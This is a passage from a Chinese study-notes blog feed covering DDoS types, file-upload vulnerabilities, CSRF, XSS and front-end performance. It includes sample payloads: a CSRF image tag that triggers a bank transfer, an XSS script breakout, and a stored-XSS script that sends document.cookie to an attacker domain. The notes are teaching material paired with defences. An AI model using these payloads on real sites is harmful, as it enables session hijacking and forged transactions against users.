    <content type="html"><![CDATA[<p>DDoS(Distributed Denial of Service)即分布式拒绝服务攻击，是目前最为强大、最难以防御的攻击方式之一</p><p>DDoS指的是攻击者借助公共网络，将数量庞大的计算机设备联合起来作为攻击平台，在同一时刻对一个或多个目标发动攻击，从而达到瘫痪目标主机的目的。利用TCP/UDP协议规律，通过占用协议栈资源或者发起大流量拥塞，达到消耗目标机器性能或者网络的目的</p><p>常见的DDoS攻击手段：</p><h4 id="SYN-Flood"><a href="#SYN-Flood" class="headerlink" title="SYN Flood"></a>SYN Flood</h4><p>TCP协议为实现可靠传输，在三次握手的过程中设置了一些异常处理机制，如果服务器没有收到客户端的ACK报文，服务端一般会进行重试，也就是再次发送SYN+ACK报文给客户端，并且一直处于SYN_RECV状态，将客户端加入等待列表。重发一般会进行3~5次，大约每隔30秒左右会轮询一遍等待队列，重试所有客户端；另一方面，服务器在发出SYN+ACK报文后，会预分配一部分资源给即将建立的TCP连接，这个资源在等待重试期间一直保留，更为重要的是，服务器资源有限，可以维护的等待列表超过极限后就不再接收新的SYN报文，也就是拒绝建立新的TCP连接</p><p>SYN Flood正是利用了TCP协议三次握手的过程来达到攻击的目的，攻击者伪造大量的IP地址给服务器发送SYN报文，但是由于伪造的IP地址几乎不可能存在，也就不可能从客户端得到任何回应，服务端将维护一个非常大的半连接等待列表，并且不断对这个列表中的IP地址进行遍历和重试，占用了大量的系统资源，更为严重的是，由于服务器资源有限，大量的恶意客户端信息占满了服务器的等待队列，导致服务器不再接收新的SYN请求，正常用户无法完成三次握手与服务器进行通信，这便是SYN Flood攻击</p><p>可以在收到客户端第三次握手reset 、第二次握手发送错误的ack，等Client回复Reset，结合信任机制进行判断。</p><p>ack flood：<br>丢弃三次ack，让对方重连：重发syn建立链接，后续是syn flood防护原理；学习正常ack的源，超过阈值后，该ack没有在正常源列表里面就丢弃ack三次，让对方重连：重发syn建立链接，后续是syn flood防护。</p><p>DNS Query Flood</p><p>DNS Query Flood实际上是UDP Flood攻击的一种变形，由于DNS服务在互联网中具有不可替代的作用，一旦DNS服务器瘫痪，影响甚大</p><p>DNS Query Flood攻击采用的方法是向被攻击的服务器发送海量的域名解析请求，通常， 请求解析的域名是随机生成的，大部分根本不存在，并且通过伪造端口和客户端IP，防止查询请求被ACL（访问控制列表）过滤，被攻击的DNS服务器在接收到域名解析请求后，首先会在服务器上查找是否有对应的缓存，由于域名是随机生成的，几乎不可能有相应的缓存信息，当没有缓存，且该域名无法直接由该DNS服务器进行解析时，DNS服务器会向其上层DNS服务器递归查询域名信息，直到全球互联网的13台根DNS服务器。大量不存在的域名解析请求给服务器带来了很大的负载，当解析请求超过一定量时，就会造成DNS服务器解析域名超时，这样攻击者便达成了攻击目的</p><p>CC攻击</p><p>CC(Challenge Collapsar)攻击属于DDoS的一种，是基于应用层HTTP协议发起的DDoS攻击，也被称为HTTP Flood</p><p>CC攻击的原理是：攻击者通过控制的大量”肉鸡”或者利用从互联网上搜寻的大量匿名的HTTP代理，模拟正常用户给网站发起请求直到该网站拒绝服务为止，大部分网站会通过CDN以及分布式缓存来加快服务端响应，提升网站的吞吐量，而这些精心构造的HTTP请求往往有意避开这些缓存，需要进行多次DB查询操作或者一次请求返回大量的数据，加速系统资源消耗，从而拖垮后端的业务处理系统，甚至连相关存储与日志收集系统也无法幸免</p>]]></content>
    
    
    <summary type="html">DDoS(Distributed Denial of Service)即分布式拒绝服务攻击，是目前最为强大、最难以防御的攻击方式之一</summary>
    
    
    
    <category term="web攻击" scheme="http://example.com/categories/web%E6%94%BB%E5%87%BB/"/>
    
    
    <category term="DDos攻击" scheme="http://example.com/tags/DDos%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://example.com/2020/09/10/Study%20notes/%E5%AF%86%E7%A0%81%E5%AD%A6/web%E6%94%BB%E5%87%BB/3%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2020/09/10/Study%20notes/%E5%AF%86%E7%A0%81%E5%AD%A6/web%E6%94%BB%E5%87%BB/3%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-10T06:38:17.000Z</published>
    <updated>2020-09-19T00:57:43.610Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传攻击指的是恶意攻击者利用一些站点没有对文件的类型做很好的校验，上传了可执行的文件或者脚本，并且通过脚本获得服务器上相应的权力，或者是通过诱导外部用户访问、下载上传的病毒或木马文件，达到攻击的目的</p><ul><li>1、文件上传的目录设置为不可执行</li><li>2、上传的文件需要使用随机数等进行重命名，使攻击者无法猜测到上传文件的访问路径</li><li>3、对于图片类型的文件，可以在上传后，利用imagemagick等工具对图片进行相应的缩放，破坏恶意用户上传的二进制可执行文件的结构，来避免恶意代码执行</li><li>4、对HTTP包头的content-type也和上传文件的大小也需要进行检查。</li><li>5、不能简单地通过后缀名来判断文件类型，很多类型的文件起始的几个字节内容是固定的，根据这几个字节(魔数)的内容就可以确定文件类型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">public enum FileType&#123;</span><br><span class="line">    JPEG(&quot;FFD8FF&quot;),</span><br><span class="line">    PNG(&quot;89504E47&quot;),</span><br><span class="line">    GIF(&quot;47494638&quot;),</span><br><span class="line">    TIFF(&quot;49492A00&quot;),</span><br><span class="line">    BMP(&quot;424D&quot;),</span><br><span class="line">    DWG(&quot;41433130&quot;),</span><br><span class="line">    PSD(&quot;38425053&quot;),</span><br><span class="line">    XML(&quot;3C3F786D6C&quot;),</span><br><span class="line">    HTML(&quot;68746D6C3E&quot;),</span><br><span class="line">    PDF(&quot;255044462D312E&quot;),</span><br><span class="line">    ZIP(&quot;504B0304&quot;),</span><br><span class="line">    RAR(&quot;52617221&quot;),</span><br><span class="line">    WAV(&quot;57415645&quot;),</span><br><span class="line">    AVI(&quot;41564920&quot;),</span><br><span class="line"></span><br><span class="line">    private String value &#x3D; &quot;&quot;;</span><br><span class="line">    private FileType(String value)&#123;</span><br><span class="line">        this.value &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getValue()&#123;</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setValue(String value)&#123;</span><br><span class="line">        this.value &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *读取文件头</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"> private static String getFileHeader(String filePath) throws IOException &#123;</span><br><span class="line">     &#x2F;&#x2F;这里需要注意的是，每个文件的魔数的长度都不相同，因此需要使用startwith</span><br><span class="line">     byte[] b &#x3D; new byte[28];</span><br><span class="line">     InputStream is &#x3D; null;</span><br><span class="line">     is &#x3D; new FileInputStream(filePath);</span><br><span class="line">     is.read(b, 0, 28);</span><br><span class="line">     is.close();</span><br><span class="line"></span><br><span class="line">     return bytes2hex(b);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#x2F;**</span><br><span class="line">  *判断文件类型</span><br><span class="line">  *&#x2F;</span><br><span class="line">  public static FileType getType(String filePath) throws IOException &#123;</span><br><span class="line">      String fileHead &#x3D; getFileHeader(filePath);</span><br><span class="line">      if(fileHead &#x3D;&#x3D; null || fileHead.length() &#x3D;&#x3D; 0)&#123;</span><br><span class="line">          return null;</span><br><span class="line">      &#125;</span><br><span class="line">      fileHead &#x3D; fileHead.toUpperCase();</span><br><span class="line">      FileType[] fileTypes &#x3D; FileType.values();</span><br><span class="line">      for(FileType type : fileTypes)&#123;</span><br><span class="line">          if(fileHead.startsWith(type.getValue()))&#123;</span><br><span class="line">              return type;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      return null;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">文件上传攻击指的是恶意攻击者利用一些站点没有对文件的类型做很好的校验，上传了可执行的文件或者脚本，并且通过脚本获得服务器上相应的权力，或者是通过诱导外部用户访问、下载上传的病毒或木马文件，达到攻击的目的</summary>
    
    
    
    <category term="web攻击" scheme="http://example.com/categories/web%E6%94%BB%E5%87%BB/"/>
    
    
    <category term="文件上传漏洞" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>CRSF攻击</title>
    <link href="http://example.com/2020/09/08/Study%20notes/%E5%AF%86%E7%A0%81%E5%AD%A6/web%E6%94%BB%E5%87%BB/2%E3%80%81CRSF%E6%94%BB%E5%87%BB/"/>
    <id>http://example.com/2020/09/08/Study%20notes/%E5%AF%86%E7%A0%81%E5%AD%A6/web%E6%94%BB%E5%87%BB/2%E3%80%81CRSF%E6%94%BB%E5%87%BB/</id>
    <published>2020-09-08T12:42:55.000Z</published>
    <updated>2020-09-19T00:57:43.606Z</updated>
    
    <content type="html"><![CDATA[<p>跨站请求伪造。你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求<img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="image"></p><p>要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p><p>　　1.登录受信任网站A，并在本地生成Cookie。</p><p>　　2.在不登出A的情况下，访问危险网站B。</p><p>示例1：</p><p>银行网站A，它以GET请求来完成银行转账的操作，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.mybank.com&#x2F;Transfer.php?toBankId&#x3D;11&amp;money&#x3D;1000</span><br></pre></td></tr></table></figure><p>危险网站B，它里面有一段HTML的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">　　&lt;img src&#x3D;http:&#x2F;&#x2F;www.mybank.com&#x2F;Transfer.php?toBankId&#x3D;11&amp;money&#x3D;1000&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">跨站请求伪造。你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求![image](https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg)</summary>
    
    
    
    <category term="web攻击" scheme="http://example.com/categories/web%E6%94%BB%E5%87%BB/"/>
    
    
    <category term="CRSF攻击" scheme="http://example.com/tags/CRSF%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>XSS攻击</title>
    <link href="http://example.com/2020/09/08/Study%20notes/%E5%AF%86%E7%A0%81%E5%AD%A6/web%E6%94%BB%E5%87%BB/1%E3%80%81XSS%E6%94%BB%E5%87%BB/"/>
    <id>http://example.com/2020/09/08/Study%20notes/%E5%AF%86%E7%A0%81%E5%AD%A6/web%E6%94%BB%E5%87%BB/1%E3%80%81XSS%E6%94%BB%E5%87%BB/</id>
    <published>2020-09-08T12:37:10.000Z</published>
    <updated>2020-09-19T00:57:43.604Z</updated>
    
    <content type="html"><![CDATA[<p>XSS 即（Cross Site Scripting）中文名称为：跨站脚本攻击</p><p>恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行</p><p>假设页面上有个需要用户填写的表单，表单填好后的结果是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;nick&quot; value&#x3D;&quot;xiaomao&quot;&gt;</span><br></pre></td></tr></table></figure><p>但是当输入的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#x2F;&gt;&lt;script&gt;alert(&quot;haha&quot;)&lt;&#x2F;script&gt;&lt;!-</span><br></pre></td></tr></table></figure><p>这一串就会被当做用户名提交到服务器，服务端验证不通过时，重定向到登录页面并带上刚才输入的用户名因为输入框input的后面带上了一段脚本，所以浏览器会执行，这里的效果是会弹出一个提示框”haha“。若指引用户点击跳转的病毒链接，这危害较大。</p><h4 id="反射型XSS："><a href="#反射型XSS：" class="headerlink" title="反射型XSS："></a>反射型XSS：</h4><p>特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。例如上面的例子</p><h4 id="存储型XSS："><a href="#存储型XSS：" class="headerlink" title="存储型XSS："></a>存储型XSS：</h4><p>将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</p><p>例如攻击者在博客网站上面发布了一篇文章，输入内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&quot;www.gongji.com?param&#x3D;&quot;+document.cookie)&lt;&#x2F;script&gt; </span><br></pre></td></tr></table></figure><p>没有进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候.服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie然后会把cookie发送到攻击者的服务器上了。</p><h4 id="DOM-based型XSS："><a href="#DOM-based型XSS：" class="headerlink" title="DOM-based型XSS："></a>DOM-based型XSS：</h4><p>js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容 如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。</p><h4 id="XSS防范："><a href="#XSS防范：" class="headerlink" title="XSS防范："></a>XSS防范：</h4><p>XSS攻击的起源都是来自页面的输入，因此我们只需对==用户的输入所有内容强校验==。</p><ul><li>1、在前端进行用户输入内容过滤，如电话号码，用户名可直接限制只能输入对应字符。</li><li><ol start="2"><li>将用户输入的内容进行HTML转义存储，如尖括号，斜杠，单/双引号（消毒几乎是所有网站最必备的XSS防攻击手段）</li></ol></li><li>3、对于cookie劫持，我们可以为关键的cookie字段设置http-only，然后就无法通过document对象获取cookie，但不影响其加载网页。</li></ul>]]></content>
    
    
    <summary type="html">XSS 即（Cross Site Scripting）中文名称为：跨站脚本攻击</summary>
    
    
    
    <category term="web攻击" scheme="http://example.com/categories/web%E6%94%BB%E5%87%BB/"/>
    
    
    <category term="XSS攻击" scheme="http://example.com/tags/XSS%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Web前端性能优化</title>
    <link href="http://example.com/2020/09/08/Study%20notes/%E5%89%8D%E7%AB%AF/Web%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    <id>http://example.com/2020/09/08/Study%20notes/%E5%89%8D%E7%AB%AF/Web%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</id>
    <published>2020-09-08T09:51:16.000Z</published>
    <updated>2020-09-19T00:57:43.585Z</updated>
    
    <content type="html"><![CDATA[<h4 id="浏览器访问优化："><a href="#浏览器访问优化：" class="headerlink" title="浏览器访问优化："></a>浏览器访问优化：</h4><p>1、减少http请求<br> 合并CSS、合并Javascript、合并图片。将浏览器一次访问所需要的的js css合并成一个文件</p><p>2、使用浏览器缓存<br>对于更新频率低的资源，通过设置HTTP头中的Cache-Control和Expires属性，可设定浏览器缓存，缓存时间可以是数天，甚至几个月。</p><p>3、启用压缩#<br> 对文本文件，HTML、CSS、Javascript文件启用GZip压缩可达到较好的效果。但是压缩对服务器和浏览器产生一定的压力，在通信带宽良好，而服务器资源不足的情况下要权衡考虑。</p><p>4、CSS放在页面最上面、Javascript放在页面最下面#<br>== 浏览器在下载完全部的CSS之后才对整个页面进行渲染，所以最好将CSS放在页面最上面==，让浏览器尽快下载CSS。</p><p>浏览器在加载Javascript后立即执行，有可能会阻塞整个页面，造成页面显示缓慢，因此最好将Javascript放在页面最下面。</p><p>但是如果页面解析就需要用到Javascript，这时放在底部就不合适了。</p><p>5、减少Cookie传输#<br> Cookie包含在每次请求中，太大的Cookie会严重影响数据传输，因此哪些数据需要写入Cookie需要慎重考虑，尽量减少Cookie中传输的数据量。</p><p>==静态资源如CSS、Script使用独立域名访问==，避免请求静态资源时发送Cookie，减少Cookie传输的次数。</p><h4 id="CDN加速"><a href="#CDN加速" class="headerlink" title="CDN加速"></a>CDN加速</h4><p>CDN(Content Distribute Network)本质仍然是一个缓存，而且将数据缓存在离用户最近的地方，使用户以最快速度获取数据，即网络访问第一跳。</p><p>CDN能够缓存的一般时静态资源，如图片、文件、CSS、Script脚本、静态网页等，但是这些文本访问频度很高，将其缓存在CDN可极大改善网页的打开速度。</p><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理#"></a>反向代理#</h4><p> 反向代理服务器位于网站机房一侧，代理网站Web服务器接收HTTP请求。</p><p> 代理服务器可以通过配置缓存功能加速Web请求。</p><p>负载均衡也是主要功能，通过负载均衡构建应用集群可以提高系统处理能力，进而改善网站高并发情况下的性能。</p>]]></content>
    
    
    <summary type="html">浏览器访问优化：</summary>
    
    
    
    <category term="前端" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="Web前端性能优化" scheme="http://example.com/tags/Web%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
</feed>
